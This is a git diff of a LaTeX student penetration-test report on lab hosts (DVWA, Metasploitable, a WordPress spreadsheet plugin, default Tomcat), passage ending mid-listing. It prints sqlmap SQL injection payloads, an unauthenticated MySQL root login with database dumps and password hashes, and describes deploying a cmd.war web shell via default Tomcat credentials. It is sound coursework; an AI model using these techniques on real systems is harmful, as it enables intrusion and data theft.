@@ -31,7 +31,7 @@
 
 \sisetup{round-mode = places, round-precision = 2}
 
-\title{Penetration Test Report}
+\title{SAIT 230 - Penetration Testing Report}
 %\date{}
 \author{Mo Khan}
 
@@ -52,23 +52,7 @@ network in a targeted attack against the hosts identified on the private network
 The following report details the findings and recommendations, intended to be submitted
 to the instructor for grading.
 
-\subsection{Summary of Results}
-
-During testing, the following major items led to compromise of systems and control
-of key web applications and user data.
-
-\begin{enumerate}
-  \item Cross Site Scripting
-  \item SQL Injection vulnerability leading to full database dump.
-  \item Root access to MySQL server.
-  \item SQL Injection vulnerability in Wordpress plugin leading to admin access.
-  \item Default Tomcat installation
-\end{enumerate}
-
-The following sections details the penetration testing results and provides 
-recommendations to remediate the issues identified.
-
-\subsubsection{Project Scope}
+\subsection{Project Scope}
 
 The scope of the assessment included penetration testing against the below systems:
 
@@ -79,7 +63,7 @@ The scope of the assessment included penetration testing against the below syste
   \item ultimatelamp.sait230.ca (10.2.1.3)
 \end{itemize}
 
-\subsubsection{Methodology}
+\subsection{Methodology}
 
 The following methodology was used:
 
@@ -90,26 +74,28 @@ The following methodology was used:
   \item[Post Exploitation] We document and report all findings during the previous steps.
 \end{description}
 
+\subsection{Tools}
+
 The following tools were utilized to conduct the penetration test:
 
-\begin{itemize}
-  \item genlist
-  \item httpprint
-  \item ifconfig
-  \item nessus
-  \item nikto
-  \item nmap
-  \item sqlmap
-  \item wget
-  \item wpscan
-\end{itemize}
+\begin{description}
+  \item[GNU Wget] The non-interactive network downloader.
+  \item[Genlist] ping scanner.
+  \item[Nessus] is a proprietary comprehensive vulnerability scanner which is developed by Tenable Network Security.
+  \item[Nmap] Network exploration tool and security / port scanner.
+  \item[WPScan] WordPress Security Scanner by ethicalhack3r.co.uk.
+  \item[httpprint] httprint v0.301 (beta) - web server fingerprinting tool.
+  \item[ifconfig] system administration utility in Unix-like operating systems for network interface configuration.
+  \item[nikto] web server scanner which performs comprehensive tests against web servers for multiple items.
+  \item[sqlmap] automatic SQL injection and database takeover tool.
+\end{description}
 
-\subsubsection{Issue Severity Rating}
+\subsection{Issue Severity Rating}
 
 The issues are rated according to the following severity:
 
 \begin{center}
-  \begin{tabular}{ | l | l | }
+  \begin{tabular}{| l | l |}
     \hline
     \textbf{Severity} & \textbf{Description} \\ \hline \hline
     High & Issue led to full system compromise. \\ \hline
@@ -119,40 +105,471 @@ The issues are rated according to the following severity:
   \end{tabular}
 \end{center}
 
-\subsubsection{Technical Summary of Issues}
+\subsection{Summary of Results}
+
+During testing, the following major items led to compromise of systems and control
+of key web applications and user data.
+
+\begin{enumerate}
+  \item DVWA Cross Site Scripting
+  \item DVWA SQL Injection.
+  \item Root access to MySQL server.
+  \item Vulnerable Wordpress Spreadsheet Plugin
+  \item Default Tomcat Installation
+\end{enumerate}
+
+The following sections details the penetration testing results and provides
+recommendations to remediate the issues identified.
+
+\subsection{Technical Summary of Issues}
 
 \begin{center}
   \begin{tabular}{| l | l | | l |}
     \hline
     \textbf{Severity} & \textbf{Issue Title} & \textbf{Recommendation Summary} \\ \hline \hline
-    High & Cross Site Scripting & Validate all user input \\ \hline
-    High & SQL Injection vulnerability & Validate all user input, use different mysql account for each application. \\ \hline
+    Medium & DVWA Cross Site Scripting & Validate all user input \\ \hline
+    High & DVWA SQL Injection & Validate all user input. \\ \hline
     High & Root access to MySQL server. & Disable mysql root account. \\ \hline
-    High & SQL Injection vulnerability in Wordpress plugin leading to admin access. & Disable vulnerable plugin or upgrade. \\ \hline
-    High & Default Tomcat installation & Change default tomcat installation and control access to admin interface. \\ \hline
+    Medium & Vulnerable Wordpress Spreadsheet Plugin. & Disable vulnerable plugin or upgrade. \\ \hline
+    High & Default Tomcat Installation & Change default tomcat installation. \\ \hline
     \hline
   \end{tabular}
 \end{center}
 
-\paragraph{Paragraph}
+\newpage
+\section{DVWA Cross Site Scripting}
 
-Some more text.
+\begin{description}
+  \item[Severity] High
+  \item[Impact] Full data loss.
+  \item[Affected Resources/System] http://bwa.sait230.ca/dvwa/
+  \item[Summary] SQL Injection vulnerability
+\end{description}
 
-\subparagraph{Subparagraph}
+\paragraph{XSS}
+In the DVWA web application I found a page called "XSS reflected". 
+On this page, there is a textbox where you can enter some text and then 
+click on the submit button.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/dvwa-xss-page.png}
+	\caption{XSS Page.}
+	\label{fig:xss-page1}
+\end{figure}
+
+If you look closely in the Figure~\ref{fig:xss-page1} you can see a 
+query string parameter appended to the URL in the address bar.
 
 \newpage
-\section{Cross Site Scripting}
+I tampered with the query string parameter to see if I could get
+some arbitrary javascript code to execute in the context of this
+page.
 
-Even more text.
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/dvwa-xss-page-exploit.png}
+	\caption{XSS Page.}
+	\label{fig:xss-page2}
+\end{figure}
+
+In Figure~\ref{fig:xss-page2} you can see I was able to hijack the logged
+in users session cookie. This allows an attacker to post the logged in
+users session cookie to a server that the attacker owns. This would allow
+an attacker to log in as any user that opened this page with the specially
+crafted URL.
+
+\paragraph{Recommendation}
+
+Validate user input. HTML encode any user input data before rendering.
 
 \newpage
-\section{SQL Injection vulnerability}
+\section{DVWA SQL Injection}
+
+\begin{description}
+  \item[Severity] High
+  \item[Impact] Full data loss.
+  \item[Affected Resources/System] http://bwa.sait230.ca/dvwa/
+  \item[Summary] SQL Injection vulnerability
+\end{description}
+
+There is a sql injection vulnerability in a web application called DVWA\@.
+After logging in to the DVWA application. I changed the security level of the application to low
+and found a page called "SQL Injection".
+
+This page contained a single text box used for searching for a specific user by their id.
+When you enter a user id and click on submit, this page would send a GET request to 
+
+\begin{lstlisting}
+GET http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
+\end{lstlisting}
+
+I grabbed my session cookie value by opening the Web Console in my browser.
+Then I used javascript to get the document.cookie. The cookie that this server
+returns does not mark the cookie as HTTPOnly, making it accessible via javascript.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/dvwa-sql-injection.png}
+	\caption{SQL injection page.}
+	\label{fig:sql-injection}
+\end{figure}
+
+\newpage
+With a valid URL and Session cookie I can now use SQLMap to test out sql injection attacks.
+I was able to get a dump of the database exported as csv files.
+
+\begin{lstlisting}[language=Bash]
+\./sqlmap.py -u "http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=40ae620791b3658e5ee7eaaefbef49dc;" --tables
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1' AND 4543=4543 AND 'qoRs'='qoRs&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1' AND (SELECT 1602 FROM(SELECT COUNT(*),CONCAT(0x3a716a663a,(SELECT (CASE WHEN (1602=1602) THEN 1 ELSE 0 END)),0x3a6664633a,FLOOR(RAND(0)*2))x FROM INFORMATION_
+SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lZPr'='lZPr&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a716a663a,0x4b574169554a4c62647a,0x3a6664633a), NULL#&Submit=Submit
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1' AND SLEEP(5) AND 'QNHQ'='QNHQ&Submit=Submit
+---
+\end{lstlisting}
+
+Here's a listing of the files:
+
+\begin{lstlisting}[language=Bash]
+root@bt-was:/pentest/database/sqlmap# tree -L 1 output/metasploitable.sait230.ca/dump/ | less
+output/metasploitable.sait230.ca/dump/
+├── dvwa
+├── information\_schema
+├── mysql
+├── owasp10
+├── tikiwiki
+└── tikiwiki195
+
+6 directories, 0 files
+
+├── guestbook.csv
+└── users.csv
+
+0 directories, 2 files
+
+\end{lstlisting}
+
+It looks like the dvwa web application running on bwa.sait230.ca was connecting to an
+instance of mysql running from metasploitable.sait230.ca. Using this sql injection vulnerability
+I was able to dump the dvwa database as well as all the other databases
+running from metasploitable.sait230.ca database server.
+
+\paragraph{Recommendation}
+
+Validate all user input. Use a different mysql account for each web application.
+Consider hosting each database on a separate database server.
+
 \newpage
 \section{Root access to MySQL server}
+
+\begin{description}
+  \item[Severity] High
+  \item[Impact] Full data loss.
+  \item[Affected Resources/System] metasploitable.sait230.ca
+  \item[Summary] MySQL root account has no password.
+\end{description}
+
+\paragraph{MySQL}
+Port 3306 is open on this host. This port
+is used by mysql. I connected to this port using the mysql client and
+using the default mysql installation user `root' without a password.
+
+\begin{lstlisting}
+root@bt-was:~# mysql -uroot -h metasploitable.sait230.ca
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 36239
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information\_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| owasp10            |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+7 rows in set (0.00 sec)
+
+mysql> 
+
+\end{lstlisting}
+
+I was able to connect to the mysql server as the root mysql
+account. This gave me full access to all databases on the database server.
+
+I used mysqldump to get a dump of all the databases on this host for offline analysis.
+
+\begin{lstlisting}
+root@bt-was:~# mysqldump -uroot -h metasploitable.sait230.ca \
+  --all-databases > all-databases.sql
+\end{lstlisting}
+
+With full root access and a mysql shell I can insert rows into any table in any database.
+I can update any record and I can read all information in all tables.
+
+\begin{lstlisting}[language=SQL]
+mysql> use dvwa
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> desc users;
++------------+-------------+------+-----+---------+-------+
+| Field      | Type        | Null | Key | Default | Extra |
++------------+-------------+------+-----+---------+-------+
+| user_id    | int(6)      | NO   | PRI | 0       |       |
+| first_name | varchar(15) | YES  |     | NULL    |       |
+| last_name  | varchar(15) | YES  |     | NULL    |       |
+| user       | varchar(15) | YES  |     | NULL    |       |
+| password   | varchar(32) | YES  |     | NULL    |       |
+| avatar     | varchar(70) | YES  |     | NULL    |       |
++------------+-------------+------+-----+---------+-------+
+6 rows in set (0.00 sec)
+
+mysql> select user, password from users;
++---------+----------------------------------+
+| user    | password                         |
++---------+----------------------------------+
+| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| gordonb | e99a18c428cb38d5f260853678922e03 |
+| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
+| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
+| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| NULL    | NULL                             |
++---------+----------------------------------+
+6 rows in set (0.01 sec)
+\end{lstlisting}
+
+\paragraph{Recommendation}
+
+Require all MySQL accounts to have a password.
+Create firewall rules to filter which hosts can connect to the MySQL server.
+
+\paragraph{References}
+
+\begin{enumerate}
+  \item http://dev.mysql.com/doc/refman/5.7/en/security-against-attack.html
+  \item https://dev.mysql.com/doc/refman/5.1/en/default-privileges.html
+\end{enumerate}
+
 \newpage
-\section{SQL Injection vulnerability in Wordpress plugin}
+\section{Vulnerable Wordpress Spreadsheet Plugin}
+\begin{description}
+  \item[Severity] High
+  \item[Impact] Admin account on wordpress site.
+  \item[Affected Resources/System] http://bwa.sait230.ca/wordpress
+  \item[Summary] Wordpress plugin has a SQL injection vulnerability
+\end{description}
+
+\paragraph{Wordpress}
+
+Using wpscan we can scan this wordpress installation to find a list of installed plugins.
+
+\begin{lstlisting}[language=Bash, firstline=26, lastline=39]
+root@bt-was:/pentest/web/wpscan# ./wpscan.rb --url bwa.sait230.ca/wordpress --enumerate p
+____________________________________________________
+ __          _______   _____                  
+ \ \        / /  __ \ / ____|                 
+  \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+    \  /\  /  | |     ____) | (__| (_| | | | |
+     \/  \/   |_|    |_____/ \___|\__,_|_| |_| v1.1
+
+  WordPress Security Scanner by ethicalhack3r.co.uk
+ Sponsored by the RandomStorm Open Source Initiative
+_____________________________________________________
+
+
+| URL: http://bwa.sait230.ca/wordpress/
+| Started on Fri Feb 12 14:40:44 2016
+
+[!] The WordPress theme in use is called "default".
+[!] The WordPress "http://bwa.sait230.ca/wordpress/readme.html" file exists.
+[!] WordPress version 2.0 identified from meta generator.
+
+[+] Enumerating installed plugins...
+
+Checking for 2892 total plugins... 100% complete.
+
+[+] We found 2 plugins:
+
+Name: mygallery
+Location: http://bwa.sait230.ca/wordpress/wp-content/plugins/mygallery/
+Directory listing enabled? Yes.
+
+Name: wpSS
+Location: http://bwa.sait230.ca/wordpress/wp-content/plugins/wpSS/
+Directory listing enabled? Yes.
+
+[+] There were 1 vulnerabilities identified from the plugin names:
+
+[!] Wordpress Plugin Spreadsheet <= 0.6 SQL Injection Vulnerability
+* Reference: http://www.exploit-db.com/exploits/5486/
+
+[+] Finished at Fri Feb 12 14:40:49 2016
+\end{lstlisting}
+
 \newpage
-\section{Default Tomcat installation}
+wpscan has detected 1 vulnerable plugin that will allow SQL injection. So I went
+to exploit db to get the details for this vulnerability.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/wp-exploitdb.png}
+	\caption{wordpress sqlinjection exploit.}
+	\label{fig:wordpress1}
+\end{figure}
+
+\newpage
+\paragraph{SQL Injection}
+Then I crafted the url to exploit the SQL injection vulnerability.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/wp-admin-credentials.png}
+	\caption{wordpress sql injection admin credentials.}
+	\label{fig:wordpress2}
+\end{figure}
+
+Using the SQL injection vulnerability I was able to get the admin credentials for this wordpress site.\ 
+
+\begin{description}
+  \item[email] admin@example.org
+  \item[username] admin
+  \item[password] 21232f297a57a5a743894a0e4a801fc3
+\end{description}
+
+\newpage
+I then took the MD5 hash for the admin account and looked up the reversed value for it.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/wp-admin-md5.png}
+	\caption{wordpress reverse md5 hash.}
+	\label{fig:wordpress3}
+\end{figure}
+
+\newpage
+Next I logged in to the wordpress site.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/wp-logged-in.png}
+	\caption{wordpress dashboard.}
+	\label{fig:wordpress4}
+\end{figure}
+
+\paragraph{Recommendation}
+
+\begin{enumerate}
+  \item Remove the vulnerable plugin.
+  \item Upgrade the vulnerable plugin.
+\end{enumerate}
+
+\paragraph{References}
+
+\begin{enumerate}
+  \item https://www.exploit-db.com/exploits/5486/
+\end{enumerate}
+
+\newpage
+\section{Default Tomcat Installation}
+
+\paragraph{Apache Tomcat}
+In the nikto scan we saw that the metasploitable box was using a defaul Apache
+Tomcat installation:
+
+\begin{lstlisting}
++ /: Appears to be a default Apache Tomcat install.
+\end{lstlisting}
+
+The default credentials to access the Tomcat manager is username: tomcat and password: tomcat.
+The first step is to open the Tomcat homepage.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/tomcat-metasploitable.png}
+	\caption{Default Tomcat install.}
+	\label{fig:tomcat-injection1}
+\end{figure}
+
+\newpage
+Then click on Tomcat Manager and enter the default credentials.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-credentials.png}
+	\caption{Default Tomcat install.}
+	\label{fig:tomcat-injection2}
+\end{figure}
+
+\newpage
+Now we can start and stop existing applications. We can upload our own WAR files.
+We can either craft a WAR file with a metasploit payload using msfvenom. In the 
+particular case I opted to use a laudanum cmd.war file.
+
+%\begin{figure}[h!]
+%	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-deploy.png}
+%	\caption{Default Tomcat install.}
+%	\label{fig:tomcat-injection3}
+%\end{figure}
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-upload.png}
+	\caption{Upload war file to Tomcat.}
+	\label{fig:tomcat-injection4}
+\end{figure}
+
+\newpage
+If we open the new cmd web application hosted at cmd/cmd.jsp, we now have the
+ability to run shell commands on this host.
+
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-cmd.png}
+	\caption{Use cmd app to run shell commands.}
+	\label{fig:tomcat-injection5}
+\end{figure}
+
+\paragraph{Recommendation}
+
+\begin{enumerate}
+  \item Change the default credentials for the Tomcat account.
+  \item Restrict access to the Tomcat manager.
+\end{enumerate}
+
+\paragraph{References}
+
+\begin{enumerate}
+  \item https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html
+\end{enumerate}
 
 %\newpage
 %\section{Attack Narrative}
@@ -165,8 +582,7 @@ Even more text.
 %\subsection{Attacker Control of Archmake Transactions}
 
 \newpage
-\section{Reconnaissance}
-\subsection{Information}
+\section{Appendix A: Reconnaissance}
 
 In order to get an understanding of what hosts are active on the network the first step 
 I took was to find out what ip address the DHCP server assigned to my backtrack host using 
@@ -184,8 +600,6 @@ eth0      Link encap:Ethernet  HWaddr 00:0c:29:4b:5c:be
           RX bytes:258604722 (258.6 MB)  TX bytes:92862199 (92.8 MB)
           Interrupt:19 Base address:0x2000 
 \end{lstlisting}
-
-\subsubsection{DNS}
 
 I used nmap\footnote{\label{nmap}nmap - Network exploration tool and security / port scanner} 
 to do a ping sweep of the active hosts in the 
@@ -222,10 +636,10 @@ nexthost: failed to determine route to 10.2.1.32
 QUITTING!
 \end{lstlisting}
 
-In total I discovered 9 active hosts on the network. All hosts were 
+In total 9 active hosts on the network were discovered. All hosts were
 located in the 10.2.1.0/24 subnet.
 
-Next, I used fping\footnote{\label{fping}fping - fping - send ICMP ECHO\_REQUEST packets to network hosts} 
+I used fping\footnote{\label{fping}fping - fping - send ICMP ECHO\_REQUEST packets to network hosts} 
 to make sure these hosts were active on the network
 
 \begin{lstlisting}
@@ -242,8 +656,7 @@ root@bt-was:~/scans# fping 10.2.1.1 10.2.1.2 10.2.1.3 10.2.1.4 10.2.1.5 10.2.1.6
 \csvautotabular{hosts.csv}
 
 \newpage
-\section{Mapping}
-\subsection{Open Ports/Services}
+\section{Appendix B: Mapping}
 
 Below is a list of open ports and services running. This list was put together using nmap.
 
@@ -279,7 +692,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
 \end{lstlisting}
 
-\subsubsection{metasploitable.sait230.ca}
+\subsection{metasploitable.sait230.ca}
 
 \begin{lstlisting}[language=bash]
 Starting Nmap 6.01 ( http://nmap.org ) at 2016-02-12 13:40 EST
@@ -364,7 +777,7 @@ just making all this up. -->
 "http://www.w3.org/TR/19 99/REC-html401-19991224/loose.dtd">
 \end{lstlisting}
 
-\subsubsection{bwa.sait230.ca}
+\subsection{bwa.sait230.ca}
 
 \begin{lstlisting}[language=bash]
 root@bt-was:~# nmap -sV bwa.sait230.ca | less
@@ -387,7 +800,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.26 seconds
 \end{lstlisting}
 
 
-\subsubsection{tomcat-apache.sait230.ca}
+\subsection{tomcat-apache.sait230.ca}
 
 \begin{lstlisting}[language=bash]
 root@bt-was:~# nmap -sV tomcat-apache.sait230.ca
@@ -407,7 +820,7 @@ Service detection performed. Please report any incorrect results at http://nmap.
 Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
 \end{lstlisting}
 
-\subsubsection{ultimatelamp.sait230.ca}
+\subsection{ultimatelamp.sait230.ca}
 
 \begin{lstlisting}[language=bash]
 root@bt-was:~# nmap -sV ultimatelamp.sait230.ca
@@ -425,7 +838,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.36 seconds
 \end{lstlisting}
 
 \newpage
-\section{Discovery}
+\section{Appendix C: Discovery}
 
 System vulnerabilities discovered
 
@@ -557,6 +970,12 @@ The results from the nessus scan are below:
 	\label{fig:nessus-metasploitable}
 \end{figure}
 
+\begin{figure}[h!]
+	\includegraphics[width=\linewidth]{images/screenshot.png}
+	\caption{Directory listing enabled.}
+	\label{fig:directory-listing}
+\end{figure}
+
 \subsection{Vulnerabilities for tomcat-apache.sait230.ca}
 nikto scan:
 
@@ -657,494 +1076,8 @@ root@bt-was:/pentest/web/nikto# ./nikto.pl -host ultimatelamp.sait230.ca -p 80
 \end{lstlisting}
 
 \newpage
-\section{Exploitation}
-\subsection{Exploits for metasploitable.sait230.ca}
-
-/paragraph{MySQL}
-I noticed that port 3306 was open on this host from the reconnaissance phase. This port
-is used by mysql. I decided to try to connect to this port using the mysql client and
-using the default mysql installation user `root'.
-
-\begin{lstlisting}
-root@bt-was:~# mysql -uroot -h metasploitable.sait230.ca
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 36239
-Server version: 5.0.51a-3ubuntu5 (Ubuntu)
-
-Copyright (c) 2000, 2011, Oracle and/or its affiliates. All rights reserved.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information\_schema |
-| dvwa               |
-| metasploit         |
-| mysql              |
-| owasp10            |
-| tikiwiki           |
-| tikiwiki195        |
-+--------------------+
-7 rows in set (0.00 sec)
-
-mysql> 
-
-\end{lstlisting}
-
-To my surprise I was able to connect to the mysql server as the root mysql
-account. This gave me access to all databases on the database server.
-
-Next, I used mysqldump to get a dump of all the databases on this host for offline analysis.
-
-\begin{lstlisting}
-root@bt-was:~# mysqldump -uroot -h metasploitable.sait230.ca --all-databases > all-databases.sql
-\end{lstlisting}
-
-With full root access and a mysql shell I can now insert rows into any table in any database. 
-I can update any record I like and I can read all information in all tables.
-
-\begin{lstlisting}[language=SQL]
-mysql> use dvwa
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+----------------+
-| Tables_in_dvwa |
-+----------------+
-| guestbook      |
-| users          |
-+----------------+
-2 rows in set (0.00 sec)
-
-mysql> desc users;
-+------------+-------------+------+-----+---------+-------+
-| Field      | Type        | Null | Key | Default | Extra |
-+------------+-------------+------+-----+---------+-------+
-| user_id    | int(6)      | NO   | PRI | 0       |       |
-| first_name | varchar(15) | YES  |     | NULL    |       |
-| last_name  | varchar(15) | YES  |     | NULL    |       |
-| user       | varchar(15) | YES  |     | NULL    |       |
-| password   | varchar(32) | YES  |     | NULL    |       |
-| avatar     | varchar(70) | YES  |     | NULL    |       |
-+------------+-------------+------+-----+---------+-------+
-6 rows in set (0.00 sec)
-
-mysql> select user, password from users;
-+---------+----------------------------------+
-| user    | password                         |
-+---------+----------------------------------+
-| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| gordonb | e99a18c428cb38d5f260853678922e03 |
-| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
-| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
-| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| NULL    | NULL                             |
-+---------+----------------------------------+
-6 rows in set (0.01 sec)
-\end{lstlisting}
-
-\newpage
-\paragraph{Apache Tomcat}
-In the nikto scan we saw that the metasploitable box was using a defaul Apache
-Tomcat installation:
-
-\begin{lstlisting}
-+ /: Appears to be a default Apache Tomcat install.
-\end{lstlisting}
-
-The default credentials to access the Tomcat manager is username: tomcat and password: tomcat.
-The first step is to open the Tomcat homepage.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/tomcat-metasploitable.png}
-	\caption{Default Tomcat install.}
-	\label{fig:tomcat-injection1}
-\end{figure}
-
-\newpage
-Then click on Tomcat Manager and enter the default credentials.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-credentials.png}
-	\caption{Default Tomcat install.}
-	\label{fig:tomcat-injection2}
-\end{figure}
-
-\newpage
-Now we can start and stop existing applications. We can upload our own WAR files.
-We can either craft a WAR file with a metasploit payload using msfvenom. In the 
-particular case I opted to use a laudanum cmd.war file.
-
-%\begin{figure}[h!]
-%	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-deploy.png}
-%	\caption{Default Tomcat install.}
-%	\label{fig:tomcat-injection3}
-%\end{figure}
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-upload.png}
-	\caption{Upload war file to Tomcat.}
-	\label{fig:tomcat-injection4}
-\end{figure}
-
-\newpage
-If we open the new cmd web application hosted at cmd/cmd.jsp, we now have the
-ability to run shell commands on this host.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/tomcat-metasploitable-cmd.png}
-	\caption{Use cmd app to run shell commands.}
-	\label{fig:tomcat-injection5}
-\end{figure}
-
-\newpage
-\subsection{Exploits for tomcat-apache.sait230.ca}
-
-
-\newpage
-\subsection{Exploits for bwa.sait230.ca}
-
-I identified and exploited a sql injection vulnerability in a web application called DVWA\@.
-After logging in to the DVWA application. I changed the security level of the application to low
-and found a page called "SQL Injection".
-
-This page contained a single text box used for searching for a specific user by their id.
-When you enter a user id and click on submit, this page would send a GET request to 
-
-\begin{lstlisting}
-GET http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
-\end{lstlisting}
-
-I grabbed my session cookie value by opening the Web Console in my browser. 
-Then I used javascript to get the document.cookie. The cookie that this server
-returns does not mark the cookie as HTTPOnly, making it accessible via javascript.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/dvwa-sql-injection.png}
-	\caption{SQL injection page.}
-	\label{fig:sql-injection}
-\end{figure}
-
-\newpage
-With a valid URL and Session cookie I can now use SQLMap to test out sql injection attacks.
-I was able to get a dump of the database exported as csv files.
-
-\begin{lstlisting}[language=Bash]
-\./sqlmap.py -u "http://metasploitable.sait230.ca/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=40ae620791b3658e5ee7eaaefbef49dc;" --tables
-sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
----
-Place: GET
-Parameter: id
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1' AND 4543=4543 AND 'qoRs'='qoRs&Submit=Submit
-
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
-    Payload: id=1' AND (SELECT 1602 FROM(SELECT COUNT(*),CONCAT(0x3a716a663a,(SELECT (CASE WHEN (1602=1602) THEN 1 ELSE 0 END)),0x3a6664633a,FLOOR(RAND(0)*2))x FROM INFORMATION_
-SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lZPr'='lZPr&Submit=Submit
-
-    Type: UNION query
-    Title: MySQL UNION query (NULL) - 2 columns
-    Payload: id=1' LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a716a663a,0x4b574169554a4c62647a,0x3a6664633a), NULL#&Submit=Submit
-
-    Type: AND/OR time-based blind
-    Title: MySQL > 5.0.11 AND time-based blind
-    Payload: id=1' AND SLEEP(5) AND 'QNHQ'='QNHQ&Submit=Submit
----
-\end{lstlisting}
-
-Here's a listing of the files:
-
-\begin{lstlisting}[language=Bash]
-root@bt-was:/pentest/database/sqlmap# tree -L 1 output/metasploitable.sait230.ca/dump/ | less
-output/metasploitable.sait230.ca/dump/
-├── dvwa
-├── information\_schema
-├── mysql
-├── owasp10
-├── tikiwiki
-└── tikiwiki195
-
-6 directories, 0 files
-
-├── guestbook.csv
-└── users.csv
-
-0 directories, 2 files
-
-\end{lstlisting}
-
-It looks like the dvwa web application running on bwa.sait230.ca was connecting to an
-instance of mysql running from metasploitable.sait230.ca. Using this sql injection vulnerability
-I was able to dump the dvwa database as well as all the other databases
-running from metasploitable.sait230.ca database server.
-
-\newpage
-\paragraph{XSS}
-Next, I found a page called "XSS reflected". On this page, there is a textbox where
-you can enter some text and then click on the submit button.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/dvwa-xss-page.png}
-	\caption{XSS Page.}
-	\label{fig:xss-page1}
-\end{figure}
-
-If you look closely in the Figure~\ref{fig:xss-page1} you can see a 
-query string parameter appended to the URL in the address bar.
-
-\newpage
-I tampered with the query string parameter to see if I could get
-some arbitrary javascript code to execute in the context of this
-page.
-
-\begin{figure}[h!]
-	\includegraphics[width=\linewidth]{images/dvwa-xss-page-exploit.png}
-	\caption{XSS Page.}
-	\label{fig:xss-page2}
-\end{figure}
-
-In Figure~\ref{fig:xss-page2} you can see I was able to hijack the logged
-in users session cookie. This allows an attacker to post the logged in
-users session cookie to a server that the attacker owns. This would allow
-an attacker to log in as any user that opened this page with the specially
-crafted URL.
-
-\newpage
-\paragraph{Wordpress}
-
-In the previous phases I saw that this host is also running a wordpress
-installation. I used wpscan to see if we could find out more about this installation.
-
-\begin{lstlisting}[language=Bash, firstline=26, lastline=39]
-root@bt-was:/pentest/web/wpscan# ./wpscan.rb --url bwa.sait230.ca/wordpress --enumerate p
-____________________________________________________
- __          _______   _____                  
- \ \        / /  __ \ / ____|                 
-  \ \  /\  / /| |__) | (___   ___  __ _ _ __  
-   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
